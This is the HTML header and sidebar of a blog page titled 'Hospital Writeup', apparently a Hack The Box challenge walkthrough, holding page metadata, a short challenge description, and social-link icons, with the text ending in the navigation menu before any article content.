<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Welcome to &#34;Hospital&#34; on Hack The Box, a dynamic cybersecurity challenge where you'll confront vulnerabilities on both Linux and Windows systems. From upload RCE to hash cracking, you'll tackle a variety of security issues to bolster the hospital's defenses. Get ready for an engaging journey of exploration and skill-building. Let's dive in and make Hospital more secure together."><title>Hospital Writeup</title>
<link rel=canonical href=https://shaanksm.github.io/p/hospital-writeup/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property='og:title' content='Hospital Writeup'><meta property='og:description' content="Welcome to &#34;Hospital&#34; on Hack The Box, a dynamic cybersecurity challenge where you'll confront vulnerabilities on both Linux and Windows systems. From upload RCE to hash cracking, you'll tackle a variety of security issues to bolster the hospital's defenses. Get ready for an engaging journey of exploration and skill-building. Let's dive in and make Hospital more secure together."><meta property='og:url' content='https://shaanksm.github.io/p/hospital-writeup/'><meta property='og:site_name' content='ShaanksFR Blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2024-02-08T00:00:00+00:00'><meta property='article:modified_time' content='2024-02-08T00:00:00+00:00'><meta property='og:image' content='https://shaanksm.github.io/p/hospital-writeup/Hospital.png'><meta name=twitter:title content="Hospital Writeup"><meta name=twitter:description content="Welcome to &#34;Hospital&#34; on Hack The Box, a dynamic cybersecurity challenge where you'll confront vulnerabilities on both Linux and Windows systems. From upload RCE to hash cracking, you'll tackle a variety of security issues to bolster the hospital's defenses. Get ready for an engaging journey of exploration and skill-building. Let's dive in and make Hospital more secure together."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://shaanksm.github.io/p/hospital-writeup/Hospital.png'><link rel="shortcut icon" href=shnks.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/shanksChcocolate_hu9f946232804ffd78d2222b7b7d624336_2033417_300x0_resize_box_1.gif width=300 height=173 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>üç•</span></figure><div class=site-meta><h1 class=site-name><a href=/>ShaanksFR Blog</a></h1><h2 class=site-description>CTF PLayer, Cyber Enthusiast Unleashing the Digital Frontier!</h2></div></header><ol class=social-menu><li><a href=https://github.com/ShaanksM target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://app.hackthebox.com/profile/382091 target=_blank title="Hack The Box" rel=me><svg fill="#000" width="800" height="800" viewBox="0 0 24 24" role="img" xmlns="http://www.w3.org/2000/svg"><path d="M11.996.0a1.119 1.119.0 00-.057.003.9.9.0 00-.236.05.907.907.0 00-.165.079L1.936 5.675a.889.889.0 00-.445.77v11.111a.889.889.0 00.47.784l9.598 5.541.054.029v.002a.857.857.0 00.083.035l.012.004c.028.01.056.018.085.024.01.001.011.003.016.004a.93.93.0 00.296.015.683.683.0 00.086-.015c.01.0.011-.002.016-.004a.94.94.0 00.085-.024l.012-.004a.882.882.0 00.083-.035v-.002a1.086 1.086.0 00.054-.029l9.599-5.541a.889.889.0 00.469-.784V6.48l-.001-.026v-.008a.889.889.0 00-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899.0 00-.107-.07L12.453.127A.887.887.0 0011.99.0zm.01 2.253c.072.0.144.019.209.056l6.537 3.774a.418.418.0 010 .724l-6.537 3.774a.418.418.0 01-.418.0L5.26 6.807a.418.418.0 010-.724l6.537-3.774a.42.42.0 01.209-.056zm-8.08 6.458a.414.414.0 01.215.057l6.524 3.766a.417.417.0 01.208.361v7.533a.417.417.0 01-.626.361l-6.523-3.766a.417.417.0 01-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16.0c.215.004.41.177.41.418v7.532a.42.42.0 01-.208.362l-6.524 3.766a.417.417.0 01-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415.0 01.216-.057z"/></svg></a></li><li><a href='https://www.root-me.org/0xShaanks?lang=fr#8403af773d506c0b99723cabb030ab8f' target=_blank title="Root Me" rel=me><svg xmlns="http://www.w3.org/2000/svg" width="234" height="300"><path d="M0 0C4.13456708 2.61701062 5.67096343 5.91611484 7.0625 10.5 6.98573748 14.79870126 6.17147636 17.2874759 4 21 .15950275 24.48324169-2.9694957 25.64513909-8.0390625 25.40234375-11.24547905 24.7444535-13.46667268 22.99047147-16 21c-3.14990159-1.57495079-5.27524296-.191702710000001-8.5625.875-26.97317536 9.09526128-49.48642797 27.70876763-62.50390625 53.05859375C-90.46506173 81.86671339-92.75693311 88.52311036-95 96-70.745 96.495-70.745 96.495-46 97-45.01 95.02-45.01 95.02-44 93-41.36673543 90.36673543-39.67446899 90.28819365-36 90-32.68741503 90.78871071-31.16780524 91.84126532-28.6875 94.1875-26.49531702 97.84113829-26.3366561 99.79882196-27 104c-2.33581872 3.70982973-3.80743715 5.60247905-8 7-4.10012005.0-6.6575483-.889005490000002-9.8125-3.5C-46 106-46 106-46 104c-17.16.0-34.32.0-52 0C-98.061875 109.135625-98.12375 114.27125-98.1875 119.5625-98.21481201 121.14877197-98.24212402 122.73504395-98.27026367 124.36938477-98.32563419 133.99492462-97.27063998 142.63626749-95 152-94.57110474 153.80803101-94.57110474 153.80803101-94.13354492 155.65258789-93.15896141 160.08989999-93.15896141 160.08989999-91 164-87.03183731 166.15163857-83.45619581 166.35686256-79.10595703 165.29077148-75.79382274 164.0927264-72.59387204 162.74228772-69.375 161.3125-68.20308105 160.81298828-67.03116211 160.31347656-65.82373047 159.79882812-47.00133946 151.81111469-47.00133946 151.81111469-28.9921875 142.1875-27 141-27 141-25 141-25 140.34-25 139.68-25 139-25.60730957 138.89405518-26.21461914 138.78811035-26.84033203 138.67895508-32.20400955 137.6833733-37.23293342 136.31979781-42.38378906 134.53759766-51.32415092 131.48679993-57.98589147 129.93265835-67 134-67.0825 135.093125-67.165 136.18625-67.25 137.3125-68 141-68 141-69.6875 142.875-73.88969288 144.91931005-76.70112816 145.43295728-81.1875 143.9375-84.59980465 141.58680124-85.69396141 139.91811578-87 136-87 132.07561572-86.24451616 130.35149198-84 127.125c3.99328059-2.82857375 7.23567484-2.93467959 12-2.125C-71.39945801 125.38309326-70.79891602 125.76618652-70.18017578 126.16088867c2.20420253 1.1233977 2.20420253 1.1233977 4.5300293-.0251464800000036C-64.75368408 125.69391602-63.85722168 125.25208984-62.93359375 124.796875-53.82304096 121.5040708-45.80723588 125.26816041-37.0625 128.25-34.55805724 129.07010918-32.05067121 129.88016852-29.54112244 130.68450928-27.99035766 131.1851221-26.44302263 131.69652836-24.8999176 132.22027588-19.54950543 134.0248706-19.54950543 134.0248706-14 134-11.42517823 132.74027513-11.42517823 132.74027513-8.91796875 130.9375-7.98662109 130.30585938-7.05527344 129.67421875-6.09570312 129.0234375-5.13599609 128.35570312-4.17628906 127.68796875-3.1875 127-2.20845703 126.33226563-1.22941406 125.66453125-.22070312 124.9765625 2.19344786 123.32787402 4.59976161 121.66884888 7 120 3.99381987 111.96955907.802557 104.09229168-2.76391602 96.29492188-4.08688902 93.35188463-5 91.26606793-5 88-6.093125 87.9175-7.18625 87.835-8.3125 87.75-12 87-12 87-13.9375 85.5-15.57484185 81.64743094-15.7766104 78.1101739-15 74c2.3933321-3.37882179 4.03278722-4.67073608 7.9375-6C-3.15544281 68-1.21525285 68.78504804 2 71c2.25132954 3.26805901 3.05587735 5.08733667 2.8125 9.0625C4 83 4 83 2.81103516 85.29760742 1.69818689 89.00565001 2.6573407 90.67155735 4.2109375 94.17578125 4.71367188 95.33271484 5.21640625 96.48964844 5.734375 97.68164062 6.27578125 98.87982422 6.8171875 100.07800781 7.375 101.3125c.54066186 1.22911542 1.07974288 2.45892752 1.6171875 3.68945312C10.31272084 108.00852456 11.64902371 111.00701432 13 114c6.3958546.0 14.13550601-9.8443841 18.8125-14.125C32.35108643 99.38483398 32.88967285 98.89466797 33.44458008 98.38964844 34.99291066 96.95436447 36.49786181 95.48338958 38 94 39.40378906 92.6696875 39.40378906 92.6696875 40.8359375 91.3125 43.89176065 86.63499453 43.77910453 82.60185678 43.8125 77.125 43.83763672 76.15046875 43.86277344 75.1759375 43.88867188 74.171875 43.94727558 71.78084372 43.98374991 69.39163153 44 67 38.4099934 65.80469769 35.08799894 66.31464383 29.8125 68.4375 25.80407799 70.0313146 23.34391767 71 19 71c-1.1760003-2.3520006-1.12084541-3.73734401-1.11352539-6.35791016C17.88658791 63.29091568 17.88658791 63.29091568 17.88670349 61.91244507 17.89186478 60.93844757 17.89702606 59.96445007 17.90234375 58.9609375 17.9037587 57.96494537 17.90517365 56.96895325 17.90663147 55.94277954 17.91224064 52.75348947 17.9247947 49.56426894 17.9375 46.375 17.94251382 44.21614685 17.94707693 42.05729259 17.95117188 39.8984375 17.96221305 34.5989345 17.97896012 29.29947222 18 24 17.07767578 23.81050781 17.07767578 23.81050781 16.13671875 23.6171875 13.2283294 22.77710429 11.9426921 21.27763901 10 19 8.75866376 15.27599129 8.45888514 11.86824 9 8c2.01502889-3.75212276 3.45466142-5.63644095 7-8 4.36895142-.65157046 8.97122501-.98495652 13.01953125.98046875C32.01023122 3.34537749 33.29496334 5.33380935 34 9 34.54785156 9.07476562 35.09570312 9.14953125 35.66015625 9.2265625 57.10876145 12.78389214 75.47766221 25.38920889 91 40 91.99773437 40.88365234 91.99773437 40.88365234 93.015625 41.78515625 108.1549695 55.78597281 118.02874389 76.24275276 123 96 123.18546387 96.69311279 123.37092773 97.38622559 123.56201172 98.1003418 125.33760154 105.59314078 125.37224228 113.11798302 125.37060547 120.77416992 125.37494619 123.03447778 125.41127763 125.29277423 125.44921875 127.55273438 125.54421006 140.00879836 123.43065198 151.45148527 119.1875 163.1875 117.92499157 167.24081653 118.07245397 168.95252642 119 173 119.49661449 177.89520002 119.48794918 181.08916153 117.125 185.5 115 188 115 188 113 189 113.00967804 189.59611084 113.01935608 190.19222168 113.02932739 190.80639648 113.12058859 197.03677113 113.14136946 203.26461333 113.12207031 209.49560547 113.12401153 211.81762967 113.14364953 214.13971158 113.18164062 216.46142578 113.47703974 235.60492973 113.47703974 235.60492973 110.11572266 241.05541992 107.52199477 243.16486435 105.0033864 244.54106942 102 246c-1.9743763 1.36534824-3.92983615 2.75838669999999-5.8671875 4.17578125C94.13273103 251.55834409 92.13010692 252.93723561 90.125 254.3125 88.10635871 255.70382934 86.08811327 257.09573322 84.0703125 258.48828125 83.19133301 259.09196533 82.31235352 259.69564941 81.40673828 260.31762695 79.8439822 261.41003435 78.3082942 262.54262463 76.80810547 263.71948242 75 265 75 265 73 265 73.01047363 265.95366455 73.02094727 266.9073291 73.03173828 267.88989258 73.06794501 271.42891688 73.09090284 274.9679248 73.10986328 278.50708008 73.11991935 280.03868361 73.133566 281.57026795 73.15087891 283.10180664 73.17514498 285.30359636 73.18648688 287.50513219 73.1953125 289.70703125 73.21079636 290.73374687 73.21079636 290.73374687 73.22659302 291.78120422 73.22745382 295.43061661 73.08567666 296.87148502 71 3e2 68.79170227 300.37473011 68.79170227 300.37473011 65.98950195 300.3742218 64.92945953 300.38123611 63.86941711 300.38825043 62.7772522 300.39547729 61.60939178 300.38783356 60.44153137 300.38018982 59.23828125 300.37231445 57.39923721 300.37779045 57.39923721 300.37779045 55.52304077 300.38337708 52.15516262 300.39010805 48.78783408 300.38334881 45.42000961 300.37004495 41.90020439 300.35874873 38.38041383 300.36283653 34.8605957 300.36479187 28.94900767 300.36567543 23.03753418 300.35458163 17.12597656 300.33618164 10.28562304 300.31501301 3.44543736 300.31150374-3.39494228 300.3177436-9.96771403 300.323433-16.5404265 300.31779662-23.1131897 300.30657005-25.91379896 300.30191842-28.71437204 300.30105264-31.51498413 300.3031559-35.42281373 300.30538461-39.33048281 300.29094859-43.23828125 300.2746582-44.40614166 300.27713562-45.57400208 300.27961304-46.7772522 300.28216553-47.83729462 300.27508072-48.89733704 300.26799591-49.98950195 300.26069641-50.91422806 300.25864354-51.83895416 300.25659067-52.79170227 300.25447559-55 3e2-55 3e2-57 298-57.03320312 295.04174805-57.03320312 295.04174805-56.78125 291.26171875c1.12301941-14.38507076 1.12301941-14.38507076-2.71777344-27.83496094C-63.43892375 259.31670243-68.27862994 256.83727315-73.35400391 254.3671875-78.03849955 251.94670627-82.25422075 248.83703237-86.5625 245.8125-89.99357443 243.51081787-89.99357443 243.51081787-93.42797852 241.21411133-95 240-95 240-96 238-96.09306947 236.47899134-96.12513235 234.95402898-96.12597656 233.43017578-96.13168671 232.00827438-96.13168671 232.00827438-96.13751221 230.55764771-96.13853943 229.53057709-96.13956665 228.50350647-96.140625 227.4453125-96.15894989 225.28254153-96.1785199 223.11978081-96.19921875 220.95703125-96.2282249 217.53774714-96.25000084 214.1191223-96.25048828 210.69970703-96.25381576 207.40597642-96.28832386 204.11377793-96.328125 200.8203125-96.3210553 199.79729034-96.3139856 198.77426819-96.30670166 197.72024536-96.27812975 191.98511981-96.27812975 191.98511981-99.4609375 187.4465332-100.29882812 186.96917725-101.13671875 186.49182129-102 186c-1.90214575-2.88186539-2.27318511-5.13689944000001-2.25-8.5625C-104.25515625 176.67308594-104.2603125 175.90867188-104.265625 175.12109375-104 173-104 173-102 170-102.1762322 167.72464609-102.1762322 167.72464609-103 165-103.17917969 164.33742187-103.35835938 163.67484375-103.54296875 162.9921875-104.18157764 160.65740087-104.83852117 158.32840548-105.5 156-105.94966944 154.41716357-106.39763456 152.83384179-106.84375 151.25-107.04162109 150.55390625-107.23949219 149.8578125-107.44335938 149.140625c-1.30111305-5.00357861000001-1.74107083-9.74257071-1.79492187-14.90625C-109.246353 133.48271057-109.25442474 132.73104614-109.26274109 131.956604-109.27654134 130.36301952-109.28728156 128.76940598-109.29516602 127.17578125-109.30656913 125.57998709-109.32683053 123.98422741-109.35668945 122.38867188-109.94168861 91.04056081-97.4507642 63.11558516-75.96801758 40.56518555-69.24853764 33.71487246-62.27137746 27.9246299-54 23-53.36223633 22.62004883-52.72447266 22.24009766-52.06738281 21.84863281c8.72517853-5.09563869 17.38894946-9.04867741 27.17944336-11.64624023C-19.60930266 8.68456797-17.79754081 6.92341099-15 2-10.30771115-1.12819257-5.4769909-.93932562.0.0zM-9.6875 8.1875C-11.4374512 10.60409928-11.37447615 12.07908607-11 15c.66.66 1.32 1.32 2 2 3.59679066-.32326553 3.59679066-.32326553 7-1 .33-1.98.66-3.96 1-6-4.01886949-3.40478665-4.01886949-3.40478665-8.6875-1.8125zM17 9C16.58333333 12 16.58333333 12 17 15c1.82703227 2.2491908 1.82703227 2.2491908 4.5 2.25C24.17296773 17.2491908 24.17296773 17.2491908 26 15 26.41666667 12 26.41666667 12 26 9c-4.01009099-2.67339399-4.98990901-2.67339399-9 0zM32 19C31.0409375 19.9590625 31.0409375 19.9590625 30.0625 20.9375 28 23 28 23 25 24c0 12.87.0 25.74.0 39 11.61394624-2.37702215 11.61394624-2.37702215 14-7.5625C39.495 53.7359375 39.495 53.7359375 40 52c2.44997979-2.71247763 3.78074936-2.968109 7.4375-3.5C51 49 51 49 53.9375 51c2.29724186 3.34144271 2.79879786 5.1007559 2.56640625 9.06640625C55.65742469 63.31453318 53.53910265 64.95633201 51 67c-1.28612676 1.05978933-1.28612676 1.05978933-1.09765625 3.50390625C49.91394531 71.51324219 49.92554688 72.52257812 49.9375 73.5625c.00902343999999999 1.01191406.01804688 2.02382812.02734375 3.06640625C49.97644531 77.41136719 49.98804688 78.19382813 50 79 53.44188729 75.02681467 55.7682238 70.93265681 58.0625 66.25 58.41320557 65.54061279 58.76391113 64.83122559 59.12524414 64.1003418 63.19499045 55.73416767 66.17588218 47.5982213 66.0625 38.1875 66.05347656 37.21167969 66.04445312 36.23585938 66.03515625 35.23046875 66.02355469 34.49441406 66.01195312 33.75835937 66 33c-9.52701629-6.0347981-22.3816277-14-34-14zM76 41C75.79246094 42.0415625 75.58492187 43.083125 75.37109375 44.15625 67.81359404 80.09983702 43.4077432 107.22408426 14 128 13.28618164 128.5048291 12.57236328 129.0096582 11.83691406 129.52978516-4.36641932 140.87211853-21.47840307 150.47315378-39.25 159.125-40.16316986 159.57034592-40.16316986 159.57034592-41.0947876 160.02468872-47.74569228 163.24883254-54.40206313 166.22517963-61.33984375 168.79296875-63.07089355 169.43758057-63.07089355 169.43758057-64.83691406 170.09521484-67.01540137 170.88667052-69.20611533 171.64550292-71.40917969 172.36572266-74.21224938 173.37425171-76.5718271 174.27195712-79 176-80.02319188 178.36422179-80.35099606 180.23774933-80.4543457 182.80541992-81 185-81 185-83.48730469 186.68383789-86.27362007 189.25221858-86.39778436 189.69952308-86.72631836 193.27441406-86.79304663 195.02061967-86.82897801 196.76817869-86.83984375 198.515625-86.85648575 199.44542175-86.87312775 200.37521851-86.89027405 201.33319092-86.91556702 203.29996398-86.92731729 205.26695119-86.92651367 207.23388672-86.93742199 210.22858496-87.02808004 213.21397262-87.12304688 216.20703125-87.51597218 226.07178779-87.51597218 226.07178779-83.984375 234.95141602-81.42345752 237.02774947-78.93776161 238.51629281-76 240-74.6348064 240.9374841-73.28181848 241.89314602-71.9453125 242.87109375-70.67409673 243.72986049-69.40064877 244.58533213-68.125 245.4375-50.87857868 257.12142132-50.87857868 257.12142132-47 261-46.84141158 263.14386657-46.74870702 265.29266838-46.68359375 267.44140625-46.64169922 268.74658203-46.59980469 270.05175781-46.55664062 271.39648438-46.51682392 272.7851533-46.47711175 274.17382522-46.4375 275.5625-46.39432011 276.95509183-46.350706 278.34767028-46.30664062 279.74023438-46.20014194 283.16002549-46.09952944 286.57999896-46 290c5.61.0 11.22.0 17 0C-28.67 285.05-28.34 280.1-28 275c2.64.0 5.28.0 8 0C-18.58365167 277.83269666-18.6536995 280.47466438-18.4375 283.625-18.31181641 285.40777344-18.31181641 285.40777344-18.18359375 287.2265625-18.12300781 288.14179688-18.06242187 289.05703125-18 290-14.68751813 290.02888146-11.37506833 290.04675799-8.0625 290.0625-7.11697266 290.07087891-6.17144531 290.07925781-5.19726562 290.08789062-4.29814453 290.09111328-3.39902344 290.09433594-2.47265625 290.09765625-1.64000244 290.10289307-.80734863 290.10812988.05053711 290.11352539 2.00516798 290.21643292 2.00516798 290.21643292 3 289 3.14386104 287.67113927 3.22676288 286.33551413 3.28125 285 3.31863281 284.195625 3.35601562 283.39125 3.39453125 282.5625 3.42933594 281.716875 3.46414062 280.87125 3.5 280 3.56860509 278.33315029 3.64130223 276.66646226 3.71875 275 3.74904297 274.2575 3.77933594 273.515 3.81054688 272.75 4 271 4 271 5 270c3-.125 3-.125 6 0 1.51062693 1.51062693 1.19532457 2.89391289000002 1.28125 5C12.33732422 276.2065625 12.33732422 276.2065625 12.39453125 277.4375 12.5 280 12.5 280 12.60546875 282.5625 12.66154297 283.7690625 12.66154297 283.7690625 12.71875 285 12.74904297 285.7425 12.77933594 286.485 12.81054688 287.25 12.81792413 289.02688855 12.81792413 289.02688855 14 290 15.40348735 290.09860131 16.81180477 290.13078937 18.21875 290.1328125 19.06824219 290.13410156 19.91773438 290.13539063 20.79296875 290.13671875 22.13294922 290.13091797 22.13294922 290.13091797 23.5 290.125 24.39332031 290.12886719 25.28664063 290.13273438 26.20703125 290.13671875 27.48126953 290.13478516 27.48126953 290.13478516 28.78125 290.1328125 29.56564453 290.13168457 30.35003906 290.13055664 31.15820312 290.12939453 33.01752988 290.20107442 33.01752988 290.20107442 34 289c.209318969999998-2.16296273.36797069-4.3309471.5-6.5C34.88888889 276.11111111 34.88888889 276.11111111 36 275c2.9375-.25 2.9375-.25 6 0C45.12340498 279.68510747 44.64033226 284.42515007 45 290c5.61.0 11.22.0 17 0C62.02578125 287.95296875 62.0515625 285.9059375 62.078125 283.796875 62.11985489 281.80775005 62.16172403 279.81862535 62.20751953 277.82958984 62.23569099 276.45048349 62.25692472 275.07121682 62.27099609 273.69189453 62.29247545 271.70577051 62.34123132 269.72000091 62.390625 267.734375 62.41157227 266.54038086 62.43251953 265.34638672 62.45410156 264.11621094 63.24273268 259.61438287 65.44409772 258.16910679 68.96020508 255.52709961 69.63978271 255.07343018 70.31936035 254.61976074 71.01953125 254.15234375 71.78797363 253.63446289 72.55641602 253.11658203 73.34814453 252.58300781 74.16138184 252.03999023 74.97461914 251.49697266 75.8125 250.9375 82.16443811 246.64740271 88.45250678 242.29515116 94.625 237.75 95.25768799 237.28456787 95.89037598 236.81913574 96.54223633 236.33959961 99.38211187 234.30251856 99.38211187 234.30251856 102 232 102.29286543 226.06966032 102.31407821 220.13683127 102.35009766 214.19995117 102.3666558 212.19690328 102.39394394 210.19391445 102.43212891 208.19116211 102.48684465 205.30811815 102.50876404 202.42646172 102.5234375 199.54296875 102.55744156 198.20059395 102.55744156 198.20059395 102.59213257 196.83110046 102.64475292 191.60017761 102.64475292 191.60017761 99.54760742 187.52709961 98.70689697 187.02315674 97.86618652 186.51921387 97 186 94.34318307 181.91383171 94.22044913 177.72654003 95 173c2-3.375 2-3.375 5-6C101.32658922 166.679051 102.66086839 166.38876835 104 166.125 106.16814051 165.60986479 106.16814051 165.60986479 108 164c4.2692742-9.28782532 4.2692742-9.28782532 4-19C111.40574219 145.81082031 110.81148437 146.62164062 110.19921875 147.45703125 96.79942602 165.4610376 96.79942602 165.4610376 88.37866211 170.59960938 85.38864639 173.61693818 85.41149205 175.16605711 85.35800171 179.27110291 85.37134552 180.08784988 85.38468933 180.90459686 85.3984375 181.74609375 85.39043121 182.59422134 85.38242493 183.44234894 85.37417603 184.31617737 85.35111042 187.02377167 85.3605657 189.72986531 85.375 192.4375 85.3788512 195.14128334 85.37537371 197.84440201 85.35440063 200.54811096 85.34234123 202.22868401 85.34493196 203.90944362 85.36410522 205.58995056 85.34213148 210.20337851 85.09422399 213.32805434 82 217 79.5390625 218.75756836 79.5390625 218.75756836 76.625 220.33984375 75.55636719 220.92830078 74.48773438 221.51675781 73.38671875 222.12304688 72.26910156 222.72181641 71.15148437 223.32058594 70 223.9375 68.91332031 224.53240234 67.82664063 225.12730469 66.70703125 225.74023438 64.53600352 226.92690724 62.36047044 228.10537625 60.18041992 229.27539062 58.08631886 230.41093449 56.0051115 231.57063865 53.9387207 232.75585938 52.98570068 233.29919922 52.03268066 233.84253906 51.05078125 234.40234375 50.21458252 234.88823975 49.37838379 235.37413574 48.5168457 235.87475586 44.16924252 237.81850434 39.61938017 238.06654355 35 237c-7.44650644-3.84128142-12.83269166-10.97469212-18.39257812-17.0859375C11.3148681 214.14553688 11.3148681 214.14553688 4.0546875 212.1796875 1.37141534 212.50410739.21999958 212.83706962-1.97265625 214.4609375-2.33230469 215.09257812-2.69195312 215.72421875-3.0625 216.375-3.63677734 217.31472656-3.63677734 217.31472656-4.22265625 218.2734375-5.13684541 219.98836744-5.13684541 219.98836744-5 222-6.33333333 222.66666667-7.66666667 223.33333333-9 224c-.99.515625-1.98 1.03125-3 1.5625-6.13324918 2.93884856-12.90008483 3.68558143000001-19.4765625 1.68359375C-38.95990781 224.05503513-43.50066901 220.35342773-47.10546875 212.98046875-48.17873902 209.40446343-47.93371533 206.64609324-47.625 202.9375-47.39526367 198.35775626-47.39586984 196.70222846-50.4296875 193.17578125c-3.01633716-2.44721203-3.01633716-2.44721203-6.1640625-4.50390625C-57.3878125 188.12015625-58.181875 187.5684375-59 187-59 186.34-59 185.68-59 185c1.78664063.72703125000001 1.78664063.72703125000001 3.609375 1.46875 35.77213618 15.59522478 35.77213618 15.59522478 72.83984375 14.4140625C19.53399037 199.97572753 21.61319151 199.05576321 23.6875 198.125 25.34048096 197.38842163 25.34048096 197.38842163 27.02685547 196.63696289 46.68152172 187.74002817 65.54615898 177.05202195 82 163 82.83015625 162.29230469 83.6603125 161.58460938 84.515625 160.85546875c15.10922621-13.23215977 27.02311067-28.46630812 29.7578125-48.8984375C115.23973835 91.55321715 102.67362497 68.6074167 89.5625 53.8125 83.45032146 47.23742026 83.45032146 47.23742026 77 41 76.67 41 76.34 41 76 41zM-96 175C-96.58350505 177.45709375-96.58350505 177.45709375-96 180-94.42304368 182.0785608-94.42304368 182.0785608-92 183-89.26601865 182.29042763-89.26601865 182.29042763-87 181-86.83318891 178.08347826-86.83318891 178.08347826-87 175-87.66 174.34-88.32 173.68-89 173-93.04622502 172.63019987-93.04622502 172.63019987-96 175zm198 0C101.55538917 177.8899704 101.61248766 179.38813841 103.1875 181.875c1.82067822000001 1.36781865 1.82067822000001 1.36781865 4.375 1C110.3261611 182.15610832 110.3261611 182.15610832 112 179 111.64111965 176.03923709 111.15341979 175.15341979 109 173 104.95377498 172.63019987 104.95377498 172.63019987 102 175zM-38 203C-38.11031801 207.71122794-38.05111397 210.25992481-35 214c4.66812256 3.45441069 8.10488772 4.59394943000001 13.91015625 4.3359375C-18.21995357 217.87460936-16.24916988 216.81384668-14 215-14 214.67-14 214.34-14 214-14.81082031 213.79246094-15.62164062 213.58492187-16.45703125 213.37109375-24.63040354 211.09701229-31.101866 207.92131404-38 203z" fill="#000" transform="translate(109,0)"/><path d="M0 0C3.0965287 2.89009346 3.83262735 5.81568369 4 10c-1.34112375 4.27483195-2.45258795 5.66948706-6.3125 8C-7.1907592 19.32291775-9.64061837 18.17969082-14 16c0-.66.0-1.32.0-2-.98742187.3609375-1.97484375.721875000000001-2.9921875 1.09375C-18.28639791 15.56266681-19.58067206 16.03140769-20.875 16.5-21.52597656 16.73847656-22.17695312 16.97695313-22.84765625 17.22265625-27.7734375 19-27.7734375 19-30 19-29.98839844 19.99902344-29.97679687 20.99804688-29.96484375 22.02734375-29.95582031 23.31769531-29.94679687 24.60804687-29.9375 25.9375-29.92589844 27.22527344-29.91429687 28.51304688-29.90234375 29.83984375-30 33-30 33-31 34-34.73811016 34.13620644-38.47030306 34.24796874-42.2109375 34.25390625-46.65103309 34.39130334-48.43724199 34.52656866-51.953125 37.484375-52.62859375 38.31453125-53.3040625 39.1446875-54 40c-2.90295805 1.45147903-4.77261779 1.37239025-8 1-3.33014331-2.01065256-5.36952397-3.26268827-6.703125-6.9375C-69.3224626 30.50804073-69.20571213 28.47313789-67.75 25.125-66 23-66 23-63 21c6.94677871-.67226891 6.94677871-.67226891 10.9375 1.875C-50 25-50 25-49 27-45.95418731 27.46954261-45.95418731 27.46954261-42.4375 27.625-40.313125 27.74875-38.18875 27.8725-36 28c0-4.29.0-8.58.0-13 13.27586207-7 13.27586207-7 20-7C-15.9175 7.2575-15.835 6.515-15.75 5.75-14.83947526 2.41140928-13.68232473 1.14585979-11-1-7.15728249-2.855105-3.82057132-1.45876359.0.0z" fill="#000" transform="translate(110,37)"/><path d="M0 0C4.3670845 1.11284779 6.17318074 3.5136871 8.91015625 6.9609375 9.65652344 7.8281543 9.65652344 7.8281543 10.41796875 8.71289062c2.12292902 2.58075849 3.53251723 4.52801545 4.0625 7.86132813-.4453125 2.19921875-.4453125 2.19921875-2.4453125 4.19921875-2.4375.3125-2.4375.3125-5 0-1.02104551-.978501949999998-2.0206121-1.97980427-3-3-2.36462492-1.00635246-2.36462492-1.00635246-5-1-2.2831838 1.1415919-4.19012683 2.19012683-6 4-2.4375.1875-2.4375.1875-5 0-.66-.66-1.32-1.32-2-2 .179199089999999-4.80424222 2.87520079-8.12982498 5.6875-11.8125.63325195-.8962207.63325195-.8962207 1.27929687-1.81054688C-4.86644776 2.33719421-3.45011776.90003072.0.0z" fill="#000" transform="translate(116.96484375,237.2265625)"/><path d="M0 0C.65097656.268125 1.30195312.53625 1.97265625.8125 5.7637045 2.29956925 9.59540797 3.65142903 13.4375 5c.73798828.26039063 1.47597656.52078125 2.23632812.7890625C19.77034806 7.23103752 23.87522476 8.64032766 28 10 27.67 10.99 27.34 11.98 27 13c-9.65109528.83922568-16.94823231-3.50841897-24.28515625-9.4140625C1 2 1 2 0 0z" fill="#949493" transform="translate(70,201)"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
